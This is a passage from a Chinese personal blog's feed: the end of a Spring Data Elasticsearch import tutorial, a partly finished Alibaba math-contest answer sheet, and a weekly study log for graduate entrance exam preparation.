class="built_in">String</span>,Object&gt; specMap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//setter、getter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>在changgou-service-goods-api中的com.changgou.goods.feign下创建SkuFeign.java</li></ul><p>该类中指定需要调用service-goods服务中SkuController.java中的哪个方法（哪个接口），并且需要注意以下几个问题：<br>1、@Feign：指定需要调用的服务名，在服务中对应的application.yml会配置服务name<br>2、@RequestMapping：同controller一样，需要配置映射路径<br>3、无论是映射路径、还是方法名、还是返回值最好都要和controller相一致<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">package</span> <span class="selector-tag">com</span><span class="selector-class">.changgou</span><span class="selector-class">.goods</span><span class="selector-class">.feign</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">java</span><span class="selector-class">.util</span><span class="selector-class">.List</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">org</span><span class="selector-class">.springframework</span><span class="selector-class">.cloud</span><span class="selector-class">.openfeign</span><span class="selector-class">.FeignClient</span>;</span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">org</span><span class="selector-class">.springframework</span><span class="selector-class">.web</span><span class="selector-class">.bind</span><span class="selector-class">.annotation</span><span class="selector-class">.GetMapping</span>;</span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">org</span><span class="selector-class">.springframework</span><span class="selector-class">.web</span><span class="selector-class">.bind</span><span class="selector-class">.annotation</span><span class="selector-class">.RequestMapping</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">com</span><span class="selector-class">.changgou</span><span class="selector-class">.entity</span><span class="selector-class">.Result</span>;</span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">com</span><span class="selector-class">.changgou</span><span class="selector-class">.goods</span><span class="selector-class">.pojo</span><span class="selector-class">.Sku</span>;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">FeignClient</span>(<span class="keyword">name</span>="<span class="keyword">goods</span>")  // 调用goods微服务中的control，是name不是value</span><br><span class="line">@RequestMapping(<span class="string">"/sku"</span>)</span><br><span class="line">public interface SkuFeign &#123;</span><br><span class="line"></span><br><span class="line">    @<span class="keyword">GetMapping</span></span><br><span class="line">    Result&lt;List&lt;Sku&gt;&gt; findAll();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>开始写changgou-service-search</li></ul><p>SkuEsMapper.java，需要继承ElasticsearchRepository，用于调用saveAll方法将数据保存至es索引库中<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">package</span> <span class="selector-tag">com</span><span class="selector-class">.changgou</span><span class="selector-class">.search</span><span class="selector-class">.dao</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">org</span><span class="selector-class">.springframework</span><span class="selector-class">.data</span><span class="selector-class">.elasticsearch</span><span class="selector-class">.repository</span><span class="selector-class">.ElasticsearchRepository</span>;</span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">org</span><span class="selector-class">.springframework</span><span class="selector-class">.stereotype</span><span class="selector-class">.Repository</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">com</span><span class="selector-class">.changgou</span><span class="selector-class">.search</span><span class="selector-class">.pojo</span><span class="selector-class">.SkuInfo</span>;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">Repository</span></span><br><span class="line"><span class="keyword">public</span> interface SkuEsMapper extends ElasticsearchRepository&lt;SkuInfo, Long&gt;  &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>SkuEsService.java<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">importData</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure></p><p>SkuEsServiceImpl.java，implements SkuEsService</p><p>注意@Service注解，可自动注入至controller<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span>  <span class="comment">// 通过自动注入Feign，来调用goods服务中的controller来查询数据</span></span><br><span class="line"><span class="keyword">private</span> SkuFeign skuFeign;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Autowired</span>  <span class="comment">// 该mapper中继承了ElasticsearchRepository，可对数据保存至es索引库中</span></span><br><span class="line"><span class="keyword">private</span> SkuEsMapper skuEsMapper;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将数据库中的数据导入es索引库</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">void</span> importData() &#123;</span><br><span class="line">    <span class="comment">// 调用Feign，查询List&lt;Sku&gt;</span></span><br><span class="line">    Result&lt;List&lt;Sku&gt;&gt; skuResult = skuFeign.findAll();</span><br><span class="line">    <span class="comment">// 将LIst&lt;Sku&gt;转成List&lt;SkuInfo&gt;</span></span><br><span class="line">    List&lt;SkuInfo&gt; skuInfoList = <span class="built_in">JSON</span>.parseArray(<span class="built_in">JSON</span>.toJSONString(skuResult.getData()), SkuInfo.class);</span><br><span class="line">    <span class="keyword">for</span> (SkuInfo skuInfo: skuInfoList) &#123;</span><br><span class="line">        <span class="comment">// 获取spec -&gt; Map(String)-&gt;Map类型</span></span><br><span class="line">        Map&lt;<span class="built_in">String</span>, <span class="built_in">Object</span>&gt; specMap = <span class="built_in">JSON</span>.parseObject(skuInfo.getSpec(), Map.class);</span><br><span class="line">        skuInfo.setSpecMap(specMap);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用Dao实现数据批量导入</span></span><br><span class="line">    skuEsMapper.saveAll(skuInfoList);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>SkuEsController.java<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@RestController</span></span><br><span class="line"><span class="variable">@CrossOrigin</span></span><br><span class="line"><span class="variable">@RequestMapping</span>(value=<span class="string">"/search"</span>)    </span><br><span class="line">public class SkuEsController &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">@Autowired</span></span><br><span class="line">    private SkuService skuService;</span><br><span class="line"></span><br><span class="line">    <span class="variable">@GetMapping</span>(value=<span class="string">"/import"</span>)</span><br><span class="line">    public Result importData() &#123;</span><br><span class="line">        <span class="selector-tag">skuService</span><span class="selector-class">.importData</span>();</span><br><span class="line">        <span class="selector-tag">return</span> <span class="selector-tag">new</span> <span class="selector-tag">Result</span>(true, StatusCode.OK, <span class="string">"执行操作成功"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>执行，数据导入</li></ul><p>在chrom浏览器中访问：<code>localhost:19085/search/import</code>即可开始将数据库中tb_sku表中的数据导入到es索引库中</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;基于SpringData-Es对Elasticsearch进行操作&quot;&gt;&lt;a href=&quot;#基于SpringData-Es对Elasticsearch进行操作&quot; class=&quot;headerlink&quot; title=&quot;基于SpringData Es对Elasticsearch进行操作&quot;&gt;&lt;/a&gt;基于SpringData Es对Elasticsearch进行操作&lt;/h1&gt;&lt;h2 id=&quot;基本环境的搭建&quot;&gt;&lt;a href=&quot;#基本环境的搭建&quot; class=&quot;headerlink&quot; title=&quot;基本环境的搭建&quot;&gt;&lt;/a&gt;基本环境的搭建&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;首先需要搭建Elasticsearch集群（参考如上，es1 es2 es3）&lt;blockquote&gt;
&lt;p&gt;注意：这里在docker中创建elasticsearch容器的过程中，需要指定一定大小的&lt;code&gt;ES_JAVA_OPTS=&amp;quot;-Xms256m -Xmx256m&amp;quot;&lt;/code&gt;值，否则后面在执行导入mysql数据表中数据到es索引库中会产生问题，建议设置为&lt;code&gt;750m&lt;/code&gt;，将数据导入到索引库之后即可重新创建es1，将值设定为&lt;code&gt;256m&lt;/code&gt;即可&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;创建changgou-service-search-api&lt;br&gt;在pom.xml文件引入相关的依赖&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=1062140215,59502734&amp;fm=26&amp;gp=0.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Java" scheme="https://muzimz.cn/categories/Java/"/>
    
    
      <category term="Java" scheme="https://muzimz.cn/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>阿里数学预赛答卷</title>
    <link href="https://muzimz.cn/2019/07/02/%E9%98%BF%E9%87%8C%E6%95%B0%E5%AD%A6%E9%A2%84%E8%B5%9B%E7%AD%94%E5%8D%B7/"/>
    <id>https://muzimz.cn/2019/07/02/阿里数学预赛答卷/</id>
    <published>2019-07-02T11:25:39.000Z</published>
    <updated>2020-02-21T02:59:34.554Z</updated>
    
    <content type="html"><![CDATA[<h2 id="阿里数学预赛答卷"><a href="#阿里数学预赛答卷" class="headerlink" title="阿里数学预赛答卷"></a><center>阿里数学预赛答卷</center></h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="**第一题**"></a><center>**第一题**</center></h3><h4 id="A题"><a href="#A题" class="headerlink" title="A题"></a><strong>A题</strong></h4><p>问：小明打算在这家店铺买一款250块的耳机和一款600块的音响，怎么买划算？<br>答：<br>由题意可知，店铺优惠券每单可叠加使用，全场优惠券每单限一张，对于该问题我们主要分两种情况讨论：</p><ul><li>第一种：两种商品一单购买</li></ul><p>使用凑单：</p><script type="math/tex; mode=display">设订单总价为W,凑单价为p,店铺优惠券数为n \\n = [\frac{850}{60}]+1=15 \\p=60-[\frac{850}{60}]=50 \\W = 250+600+50-15\times5-60=765块</script><p>不使用凑单：</p><script type="math/tex; mode=display">n = [\frac{850}{60}]=14 \\W = 250+600-14\times5-60=720块</script><ul><li>第二种：两种商品分两单购买</li></ul><p>耳机：</p><script type="math/tex; mode=display">n_1=[\frac{250}{60}]+1=5 \\W_{耳1}=250+50-5\times5-60=215块 \\n_2 = [\frac{250}{60}]=4\\W_{耳2}=250-4\times5=230块</script><p>音箱：</p><script type="math/tex; mode=display">n=[\frac{600}{60}]=10 \\W_音 = 600-5\times10-60=490块</script><script type="math/tex; mode=display">W=W_{耳1}+W_{音}=705块</script><p>综合所述：小明耳机和音箱应该分开购买，且购买耳机时在其他商店凑单50块，购买音箱时不需要凑单，这种购买方式最为划算，总价为$705块$。</p><h4 id="B题"><a href="#B题" class="headerlink" title="B题"></a><strong>B题</strong></h4><p><strong>B1题：</strong><br>问：x至少等于多少时，小明在您的店铺买耳机和音箱其中一种会更便宜？<br>答：<br>小明购买耳机：</p><script type="math/tex; mode=display">250+49-x-60-215=-1 \\x=25</script><p>小明购买音箱：</p><script type="math/tex; mode=display">600-x-60-490=-1 \\x=51</script><script type="math/tex; mode=display">∵\ 25<51 \\∴\ x=25</script><p>综上所述：x至少等于25时，小明在店铺买耳机和音箱其中一种会更便宜</p><p><strong>B2题：</strong><br>问：x至少等于多少时，小明在您的店铺既买耳机又买音箱总和会更便宜？<br>答：</p><script type="math/tex; mode=display">(250+49-x-60)+(600-x-60)-705=-1 \\x=38</script><p>综上：x至少等于38时，小明在店铺既买耳机又买音箱总和会更便宜。</p><h4 id="C题"><a href="#C题" class="headerlink" title="C题"></a><strong>C题</strong></h4><p><strong>C1题</strong>：<br>问：请以公式的形式给出最优价格$p^<em>_1$和$p_2^</em>$以及对应的最大利润期望$r_1^<em>$和$r_2^</em>$。<br>答：</p><script type="math/tex; mode=display">商家要想获利，则 p_1<S_1,此时等价于S_1的概率需要大于\frac{\mu_1-p_1}{\mu_1}\\r_1 = \frac{\mu_1-p_1}{\mu_1}(p_1-c_1) \\ 解得：p_1^*=\frac{\mu_1+c_1}{2},r_1^*=\frac{(\mu_1-c_1)^2}{4\mu_1} \\同理，∵\ S_1和S_2相互独立 \\∴\ p_2^*=\frac{\mu_2+c_2}{2},r_2^*=\frac{(\mu_2-c_2)^2}{4\mu_2}</script><p>综上：$p_1^<em>=\frac{\mu_1+c_1}{2},r_1^</em>=\frac{(\mu_1-c_1)^2}{4\mu_1},p_2^<em>=\frac{\mu_2+c_2}{2},r_2^</em>=\frac{(\mu_2-c_2)^2}{4\mu_2}$</p><p><strong>C2题：</strong><br>问：请以公式的形式给出捆绑下的最优价$p_{12}^*$。<br>答：</p><script type="math/tex; mode=display">p_{12}^*=\frac{\mu_1+\mu_2+t(c_1+c_2)}{2}\\r_{12}^*=\frac{[\mu_1+\mu_2-t(c_1)]^2}{4(\mu_1+\mu_2)}</script><p>综上：$p_{12}^<em>=\frac{\mu_1+\mu_2+t(c_1+c_2)}{2},r_{12}^</em>=\frac{[\mu_1+\mu_2-t(c_1)]^2}{4(\mu_1+\mu_2)}$</p><p><strong>C3题：</strong><br>问：单卖还是捆绑销售利润更优，还是不一定，为什么？<br>答：</p><script type="math/tex; mode=display">\frac{(\mu_1-c_1)^2}{4\mu_1}+\frac{(\mu_2-c_2)^2}{4\mu_2}=\frac{[\mu_1+\mu_2-t(c_1)]^2}{4(\mu_1+\mu_2)} \\t = \frac{\mu_1+\mu_2-\sqrt{[\frac{(\mu_1-c_1)^2}{\mu_1}+\frac{(\mu_2-c_2)^2}{\mu_2}](\mu_1+\mu_2)}}{c_1+c_2}</script><p>综上：<br>当$t &gt; \frac{\mu_1+\mu_2-\sqrt{<a href="\mu_1+\mu_2">\frac{(\mu_1-c_1)^2}{\mu_1}+\frac{(\mu_2-c_2)^2}{\mu_2}</a>}}{c_1+c_2}$时，单卖销售的利润更优<br>当$t &lt; \frac{\mu_1+\mu_2-\sqrt{<a href="\mu_1+\mu_2">\frac{(\mu_1-c_1)^2}{\mu_1}+\frac{(\mu_2-c_2)^2}{\mu_2}</a>}}{c_1+c_2}$时，捆绑销售的利润更优<br>当$t = \frac{\mu_1+\mu_2-\sqrt{<a href="\mu_1+\mu_2">\frac{(\mu_1-c_1)^2}{\mu_1}+\frac{(\mu_2-c_2)^2}{\mu_2}</a>}}{c_1+c_2}$时，两种销售方式利润一样</p><h3 id="第二题"><a href="#第二题" class="headerlink" title="**第二题**"></a><center>**第二题**</center></h3><h4 id="A题："><a href="#A题：" class="headerlink" title="A题："></a><strong>A题</strong>：</h4><p>问：小哥该怎么走最短路径？这个最短路径是多少？<br>答：<br>从路线图中，我们可以看出，若需要满足题目要求，则小哥第一步只有两种情况可走：</p><script type="math/tex; mode=display">①\ \ \ 2\to 3\\②\ \ \ 2\to 6</script><p>①&nbsp;若小哥选择第一种路线，则必须依次经过$B_1,B_3$,将这两份外卖送到$C_1,C_3$后，然后去往$B_2$提取外卖最后到达终点$C_2$。</p><p>这种方案的最短路径是$2\to3\to4\to15\to14\to13\to12\to9\to5\to6\to7\to10\to11$<br>其总路长为17个单位。</p><p>②&nbsp;若小哥选择第二种路线，则方案是先到$B_2$提取外卖并送至$C_2$，之后前往$B_1,B_3$将两份外卖送至$C_1,C_3$，最终抵达终点$C_1$</p><p>这种方案的最短路径是$2\to6\to7\to10\to11\to8\to3\to4\to15\to14\to13\to12$<br>其总路长为16个单位。</p><p>综上所述，小哥的最短路长为16个单位，其中一种路线如下：</p><center><img src="https://gss0.baidu.com/-Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/9358d109b3de9c829a7083936181800a19d84390.jpg"></center><h4 id="B题："><a href="#B题：" class="headerlink" title="B题："></a><strong>B题：</strong></h4><p><strong>B1题：</strong></p><script type="math/tex; mode=display">E(x)=\sum_{i=1}^m1*p_i=\sum_{i=1}^mp_i</script><p><strong>B2题：</strong></p><p>未收到新单的概率：$P_o=\prod_{i=1}^m(1-P_i)$<br>至少一个新单：$P=1-P_o=1-\prod_{i=1}^m(1-P_i)$</p><h4 id="C题-1"><a href="#C题-1" class="headerlink" title="C题:"></a><strong>C题:</strong></h4><p>问：请问怎么走能够最大化收益？<br>答：</p><h3 id="第三题"><a href="#第三题" class="headerlink" title="**第三题**"></a><center>**第三题**</center></h3><h4 id="A题：-1"><a href="#A题：-1" class="headerlink" title="A题："></a><strong>A题：</strong></h4><p>问：马教授可以最多依次指导多少个学生呢？<br>解：<br>由题意可知，有$n$个不同但是等价的逻辑陈述，即$”A_i=&gt;A_j”和”A_j=&gt;A_i”$是等价的，且$若”A_i=&gt;A_j，A_j=&gt;A_k”则”A_i=&gt;A_k”$。<br>首先，我们作如下链式选择，总共有$n-1$个：</p><script type="math/tex; mode=display">A_i\to A_2 \\A_2\to A_3 \\A_3\to A_4 \\\vdots \\A_{n-1}\to A_{n}</script><p>根据上面链式选择，我们作出如下分析：</p><script type="math/tex; mode=display">∵各个逻辑陈述之间具有传递性 \\∴A_1\to A_2,A_3,\cdots,A_n已经相应的被证明，不应当作为新的课题发给学生 \\同样，A_2,A_3,\cdots A_n到其他陈述也相应的被证明，也应当被剔除在外</script><p>综上所述，马教授可以最多依次指导$n-1$个学生。</p><h4 id="B题：-1"><a href="#B题：-1" class="headerlink" title="B题："></a><strong>B题：</strong></h4><p>证：$ab\leq n$。<br>答：</p><script type="math/tex; mode=display">    \begin{align}HH^T&=\left(    \begin{matrix}        h_{11} & h_{12} & \cdots & h_{1n}\\        h_{21} & h_{22} & \cdots & h_{2n}\\        \vdots & \vdots & \ddots & \vdots\\        h_{n1} & h_{n2} & \cdots & h_{nn}\\    \end{matrix} \right)\left(    \begin{matrix}        h_{11} & h_{21} & \cdots & h_{n1}\\        h_{13} & h_{23} & \cdots & h_{n3}\\        \vdots & \vdots & \ddots & \vdots\\        h_{1n} & h_{2n} & \cdots & h_{nn}\\    \end{matrix} \right) \\&=\left(    \begin{matrix}        n \\         & n & \\         &  & \ddots & \\         &  &  & n\\    \end{matrix} \right)\\&=nE_n \end{align}\\</script><p>反证法：</p><p>当ab&gt;n时,</p><ol><li>若a=1，则b&gt;n,明显不符合题意 </li><li>若a=2，则$b&gt;\frac{n}{2}$，此时，</li></ol><script type="math/tex; mode=display">    \begin{align}HH^T&=\left(    \begin{matrix}        1 & 1 & \cdots & h_{1n}\\        1 & 1 & \cdots & h_{2n}\\        \vdots & \vdots & \ddots & \vdots\\        h_{n1} & h_{n2} & \cdots & h_{nn}\\    \end{matrix} \right)\left(    \begin{matrix}        1 & 1 & \cdots & h_{n1}\\        1 & 1 & \cdots & h_{n3}\\        \vdots & \vdots & \ddots & \vdots\\        h_{1n} & h_{2n} & \cdots & h_{nn}\\    \end{matrix} \right) \\&= \end{align}\\</script><h4 id="C题："><a href="#C题：" class="headerlink" title="C题："></a><strong>C题：</strong></h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;阿里数学预赛答卷&quot;&gt;&lt;a href=&quot;#阿里数学预赛答卷&quot; class=&quot;headerlink&quot; title=&quot;阿里数学预赛答卷&quot;&gt;&lt;/a&gt;&lt;center&gt;阿里数学预赛答卷&lt;/center&gt;&lt;/h2&gt;&lt;h3 id=&quot;第一题&quot;&gt;&lt;a href=&quot;#第一题&quot; clas
      
    
    </summary>
    
      <category term="笔记" scheme="https://muzimz.cn/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="https://muzimz.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>随写录4（4.29-5.05）</title>
    <link href="https://muzimz.cn/2019/05/06/%E9%9A%8F%E5%86%99%E5%BD%954%EF%BC%884.29-5.05%EF%BC%89/"/>
    <id>https://muzimz.cn/2019/05/06/随写录4（4.29-5.05）/</id>
    <published>2019-05-06T14:43:35.000Z</published>
    <updated>2020-02-21T02:21:15.568Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="orange">我们总是喜欢拿“顺其自然”来敷衍人生道路上的荆棘坎坷，却很少承认，真正的顺其自然，其实是竭尽所能之后的不强求，而非两手一摊的不作为。</font><font color="orange"><div style="text-align: right">—— 瑞卡斯Ricas</div></font></blockquote><p>现在是2019年5月6日，距离2020考研还有<strong><font color="red">230</font></strong>天。这是Log的第四周，长达五天小长假的五一节已经过去了，五一基本上是这个学期最长的假期了，在此之后基本上就要迎接期末的到来了。这个假期总的来说不是那么尽如人意，在英语方面花了大量的时间，尤其是在单词（《恋练有词》）上的学习，以致于这周都没时间放在408上。之后通过知乎了解到前学长学姐对韦林课程的负面评价之后，心中有了些许小小的波动。可见：<a href="https://www.zhihu.com/question/306959786/answer/559746952" target="_blank" rel="noopener">如何评价朱伟以及他的韦林？</a>。自身在逐渐学习2019年版《恋练有词》这门课程时，也和大多数知乎上的答主感同身受，所以后期的打算是《恋练有词》会继续跟下去，但是可能会进一步加快进度，否则没有太多时间留给数学和专业课。</p><p>当然，上帝为你关上一扇门的同时也会为你打开一扇窗。虽然在单词上面不是很满意，但是在英语阅读理解上面却自我感觉有了不小的提高，这进一步增强了对英语的信心。以前的自己在做阅读理解的过程中总是会有文章逻辑理不清、长难句读不懂、二选一完美避开正确选项等问题，对待阅读常常会有一种恐惧心理。但现在对待阅读理解的态度的确有了一个较大的逆转，会以一种积极向上的态度去学习，甚至发现阅读理解也有其中的乐趣可言，而并非想象中的那么枯燥乏味。在这段阅读理解的学习过程中，也总结出了适合自己的做题方法：</p><ul><li>先快速阅读五道题，明白题目问的是什么，然后尝试着得到本篇文章中心论点（关键词），时间允许的话快速扫描一下选项，观察是否存在共同点</li><li>带着题干中总结出的关键词快速阅读全文中每个段落的首尾句，然后尽力理清作者的写作思路以及态度，得到全文的中心论据（主要是讲的一个什么东西），并且对文章的结构加以短暂的分析，比如说：全文是总分的形式还是总分总，首段是不是按照以例子来引出中心论据的套路等</li><li>在以上两步完成的情况下，接着就是剑鞘直击题目了，通过常用的定位方法以及前两步骤对文章的了解应该可以快速在文章中得到对应题目的定位了。</li><li>定位好之后就是逐个比较，如果确定了那就一锤定音直击正确选项，如果不确定就需要回到原文不断的比较排除，最终根据自认为可信度最高的选项走。</li></ul><p>当然，我也明白：方法是死的人是活的，在确定了适合自己方法之后，还是需要一定的题量支持，不断的去强化自己并加以总结以完善自己的做题方式，朝着更高的正确率前进。</p><a id="more"></a><h2 id="Log内容"><a href="#Log内容" class="headerlink" title="Log内容"></a>Log内容</h2><ul><li>本周复习状况</li><li>下周复习计划</li></ul><h2 id="本周复习状况"><a href="#本周复习状况" class="headerlink" title="本周复习状况"></a>本周复习状况</h2><h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><h4 id="周周长难句："><a href="#周周长难句：" class="headerlink" title="周周长难句："></a>周周长难句：</h4><blockquote><p>This success, coupled with later research showing that memory itself is not genetically determined, led Ericsson to conclude that the act of memorizing is more of a cognitive exercise than an intuitive one,<br>这种成功和后来的表明记忆本身并不是先天决定的研究使艾瑞克森总结道：记忆的行为与其说是一种先天的行为，倒不如说是一种习得的行为。</p></blockquote><font color="red">① 主语是this success，谓语是led，宾语是Ericsson，不定式to conclude作状语</font> <font color="green">② research后劲的现在分词作后置定语，that引导的从句作showing的宾语，more...than...为与其说...倒不如说</font><p>重要词：<br>coupled with： 相当于and，类似的还有along with，combile with，表伴随<br>cognitive：认知的<br>intuitive：决定的</p><h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><blockquote><p>Q1: 设</p><script type="math/tex; mode=display">A=\left[    \begin{matrix}        1 & -1 & -1 & -1\\        -1 & 1 & -1 & -1\\        -1 & -1 & 1 & -1\\        -1 & -1 & -1 & 1\\    \end{matrix}\right]</script><p>，$f(x)=x^3-2x+5$，问$B=f(A)$能否相似与对角阵，说明理由？若能相似于对角阵，求可逆阵$P$，使得$P^-BP=\Lambda$</p></blockquote><p>分析：这是一道关于线性代数的题。首先，我们根据给出的矩阵$A$可以得到它的特征值以及对应的特征向量，根据求解的结果我们可以直接得到$B=f(A)$的特征值和对应的特征向量，最后通过特征向量组合成基础解系即可求解出可逆矩阵$P$。在这里，中点主要在于$B$特征值和特征矩阵的求解，我们直接将$A$的特征值作为自变量分别带入函数$f(x)$中，然后即可得到$B$矩阵的特征值，而基础解系在变换的过程中不会发生变化。</p><font color="red">解：</font>$$|A-\lambda E|=\left[    \begin{matrix}        1-\lambda & -1 & -1 & -1\\        -1 & 1-\lambda & -1 & -1\\        -1 & -1 & 1-\lambda & -1\\        -1 & -1 & -1 & 1-\lambda\\    \end{matrix}\right]=-(\lambda+2)(\lambda-2)^3$$求解得到矩阵$A$特征值分别为$\lambda_1=-2，\lambda_2=\lambda_3=2$① 当$\lambda_1=-2$时，解得对应的特征向量为$\alpha_1=[1,1,1,1]^T$② 当$\lambda_2=\lambda_3$时，解得对应的无关特征向量为，$$\alpha_2=[1,-1,0,0]^T \\\alpha_3=[1,0,-1,0]^T \\\alpha_4=[1,0,0,-1]^T \\$$因为$f(A)\alpha=B\alpha=f(\lambda)\alpha$，所以$B=f(A)=A^3-2A+5E$，且其特征值分别如下，$$f(\lambda_1)=f(-2)=1 \\f(\lambda_2)=f(\lambda_3)=f(\lambda_4)=9$$且最终$B$的对应的特征向量依然为$\alpha_1,\alpha_2,\alpha_3，\alpha_4$，即$B$可相似于对角阵，且得到可逆矩阵$P$和$\Lambda$分别如下，$$\Lambda=\left[    \begin{matrix}        1 &  &  & \\         & 9 &  & \\         &  & 9 & \\         &  &  & 9\\    \end{matrix}\right]， P=[\alpha_1,\alpha_2，\alpha_3，\alpha_4]=\left[    \begin{matrix}        1 & 1 & 1 & 1\\        1 & -1 & 0 & 0\\        1 & 0 & -1 & 0\\        1 & 0 & 0 & -1\\    \end{matrix}\right]$$> Q2<font color="red">易错题：</font>在伯努利实验中，每次实验成功的概率为$p$，求在<font color="red">第n次成功之前恰失败了m次的概率</font><p>这道题本身并不难，但是在审题的过程中如果马虎且最求速度的话很容易就会出错，命题人玩的是一个文字游戏。通过题中描述：<font color="red">第n次成功之前恰失败了m次的概率</font>，我们可以得到以下几个重要的信息：</p><ul><li>总共是n+m次试验，且第n+m次试验是成功的</li><li>在第n+m次试验之前，即n+m-1次试验中，总共失败了m次</li><li>所以在解题的过程中以上两段需要单独拿出来求解，而不是常见的$C_{n+m}^n$</li></ul><p><font color="red">解：</font></p><script type="math/tex; mode=display">P=C_{n+m-1}^{n-1}p^{n-1}(1-p)^m \cdot p=C_{n+m-1}^{n-1}p^{n}(1-p)^m</script><blockquote><p>常见变量的数字期望和方差，<font color="red">尤其注意分布的代表符号：</font><br>① 二项分布，$X\sim B&lt;/font&gt;(n, p)$，且$E(X)，D(X)=np(1-p)$<br>② 泊松分布，$X\sim P(\lambda)$，且$E(X)=\lambda，D(X)=\lambda$<br>③ 均匀分布，$X\sim U(a, b)$，且$E(X)=\frac{a+b}{2}，D(X)=\frac{(b-a)^2}{12}$<br>④ 指数分布，$X\sim E(\lambda)$，且$E(X)=\frac{1}{\lambda}，D(X)=\frac{1}{\lambda^2}$<br>⑤ 正态分布（高斯分布），$X=N(\mu, \sigma^2)$，且$E(X)=\mu，D(X)=\sigma^2$</p></blockquote><h2 id="下周复习计划"><a href="#下周复习计划" class="headerlink" title="下周复习计划"></a>下周复习计划</h2><ul><li>通过这个假期的训练，现在的阅读理解的正确率基本上在75%左右。《恋练有词》目前已经学到Unit10了，还剩下20个Unit，之后打算每天两小时，并在20天左右完成这一轮单词的学习。</li><li>数学这周将全书中的概率论和线性代数复习完了，并且将每节的例题和课后习题完成了，下周准备准备复习高等数学部分，依然是继续刷题</li><li>408下周完成操作系统的复习</li></ul><div style="text-align: right">2018-05-06,By 木子</div>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;orange&quot;&gt;我们总是喜欢拿“顺其自然”来敷衍人生道路上的荆棘坎坷，却很少承认，真正的顺其自然，其实是竭尽所能之后的不强求，而非两手一摊的不作为。&lt;/font&gt;
&lt;font color=&quot;orange&quot;&gt;&lt;div style=&quot;text-align: right&quot;&gt;—— 瑞卡斯Ricas&lt;/div&gt;&lt;/font&gt;


&lt;/blockquote&gt;
